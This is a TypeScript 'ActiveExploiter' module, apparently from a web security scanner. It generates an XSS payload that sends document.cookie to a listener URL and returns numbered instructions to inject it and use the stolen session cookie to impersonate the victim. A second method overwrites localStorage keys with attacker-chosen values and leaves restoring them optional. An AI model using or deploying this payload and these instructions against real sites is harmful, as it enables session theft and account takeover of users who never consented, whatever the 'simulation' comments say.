/**
 * Active Exploitation Module
 * Performs limited active exploits like hijacking and data manipulation
 */

export interface ActiveExploitResult {
  exploit: string;
  success: boolean;
  details: string;
  instructions: string[];
  payload?: string;
}

export class ActiveExploiter {
  
  /**
   * Attempt to hijack a session if a vulnerability is found
   */
  async attemptSessionHijack(targetUrl: string, cookieName: string): Promise<ActiveExploitResult> {
    try {
      // 1. Simulate payload delivery
      const payload = `<script>fetch('${targetUrl}/hijack?cookie='+document.cookie)</script>`;
      
      // 2. In a real scenario, this would be injected. Here we simulate the check.
      // If we can read the cookie, we can hijack it.
      const canReadCookie = this.canReadCookie(cookieName);
      
      if (canReadCookie) {
        return {
          exploit: 'Session Hijacking',
          success: true,
          details: `Successfully simulated hijacking of session cookie: ${cookieName}`,
          instructions: [
            `1. The cookie '${cookieName}' is accessible via JavaScript.`,
            `2. Inject the following payload into a vulnerable parameter: ${payload}`,
            `3. Listener at ${targetUrl} will receive the cookie.`,
            `4. Use the stolen cookie to authenticate as the victim.`
          ],
          payload: payload
        };
      } else {
        return {
          exploit: 'Session Hijacking',
          success: false,
          details: `Cookie '${cookieName}' is protected (likely HttpOnly).`,
          instructions: ['Enable HttpOnly on session cookies to prevent this.']
        };
      }
    } catch (error) {
        return {
            exploit: 'Session Hijacking',
            success: false,
            details: `Exploit failed: ${(error as Error).message}`,
            instructions: []
        };
    }
  }

  /**
   * Attempt Local Storage Modification (Hijack state)
   */
  async attemptLocalStorageHijack(key: string, maliciousValue: string): Promise<ActiveExploitResult> {
    try {
      // 1. Check if key exists
      // const originalValue = localStorage.getItem(key);
      
      // 2. Modify it
      localStorage.setItem(key, maliciousValue);
      
      // 3. Verify
      const newValue = localStorage.getItem(key);
      
      if (newValue === maliciousValue) {
        // Restore for safety in this demo, or leave it if "aggressive"
        // localStorage.setItem(key, originalValue || ''); 
        
        return {
          exploit: 'Local Storage Hijacking',
          success: true,
          details: `Successfully modified Local Storage key '${key}'.`,
          instructions: [
            `1. Local Storage key '${key}' is writable.`,
            `2. We injected malicious value: '${maliciousValue}'.`,
            `3. The application may now behave unexpectedly or grant unauthorized access.`
          ],
          payload: `localStorage.setItem('${key}', '${maliciousValue}')`
        };
      }
      
      return {
        exploit: 'Local Storage Hijacking',
        success: false,
        details: 'Failed to modify Local Storage.',
        instructions: []
      };
    } catch (error) {
        return {
            exploit: 'Local Storage Hijacking',
            success: false,
            details: `Exploit failed: ${(error as Error).message}`,
            instructions: []
        };
    }
  }

  private canReadCookie(name: string): boolean {
    return document.cookie.includes(`${name}=`);
  }
}

